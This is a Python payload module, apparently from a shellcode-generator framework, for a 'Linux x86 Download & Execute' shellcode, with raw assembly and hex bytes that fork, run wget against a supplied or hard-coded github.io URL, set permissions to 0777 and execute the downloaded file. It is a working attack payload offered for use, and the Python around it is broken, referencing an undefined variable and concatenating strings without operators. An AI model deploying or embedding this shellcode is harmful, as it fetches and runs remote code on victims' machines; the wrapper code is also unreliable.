from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
	Shellcode.info["author"] = "B3mB4m"
	Shellcode.info["name"] = "Linux x86 Download & Execute Shellcode"
	Shellcode.info["references"] = [
		"https://www.exploit-db.com/exploits/39389/"
	]
	Shellcode.info["size"] = \
			101 + Shellcode.getsize(kwargs["filename"])*2 + Shellcode.getsize([kwargs["url"]])
	

	Shellcode.info["rawassembly"] = [
		"xor eax,eax",
		"mov al,0x2",
		"int 0x80",
		"xor ebx,ebx",
		"cmp eax,ebx",
		"jz 0x47",
		"xor ecx,ecx",
		"xor ebx,ebx",
		"xor eax,eax",
		"push byte +0x5",
		"mov ecx,esp",
		"mov ecx,esp",
		"mov ebx,esp",
		"mov al,0xa2",
		"int 0x80",
		"xor ecx,ecx",
		"xor eax,eax",
		"push eax",
		"mov al,0xf",
		"push byte +0x68",
		"mov ebx,esp",
		"xor ecx,ecx",
		"mov cx,0x1ff",
		"int 0x80",
		"xor eax,eax",
		"push eax",
		"push byte +0x68",
		"mov ebx,esp",
		"push eax",
		"mov edx,esp",
		"push ebx",
		"mov ecx,esp",
		"mov al,0xb",
	 	"int 0x80",
		"xor eax,eax",
		"inc eax",
		"int 0x80",
		"push byte +0xb",
		"pop eax",
		"cdq",
		"push edx",
		"push dword 0x682f6365",
		"push dword 0x78652f2f",
		"push dword 0x6f692e62",
		"push dword 0x75687469",
		"push dword 0x672e6d34",
		"push dword 0x626d3362",
		"mov ecx,esp",
		"push edx",
		"push byte +0x74",
		"push dword 0x6567772f",
		"push dword 0x6e69622f",
		"push dword 0x7273752f",
		"mov ebx,esp",
		"push edx",
		"push ecx",
		"push ebx",
		"mov ecx,esp",
		"int 0x80",
	]

	
	def __init__(self, **kwargs): 
		Shellcode.info["payload"] = [
			r"\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74"
			r"\x3b\x31\xc9\x31\xdb\x31\xc0\x6a\x05\x89\xe1"
			r"\x89\xe1\x89\xe3\xb0\xa2\xcd\x80\x31\xc9\x31"
			r"\xc0\x50\xb0\x0f"
			kwargs["filename"] 
			r"\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31"
			r"\xc0\x50"
			kwargs["filename"]
			r"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd"
			r"\x80\x31\xc0\x40\xcd\x80\x6a\x0b\x58\x99\x52"
			kwargs["url"]
			r"\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68"
			r"\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3"
			r"\x52\x51\x53\x89\xe1\xcd\x80"

		]
		


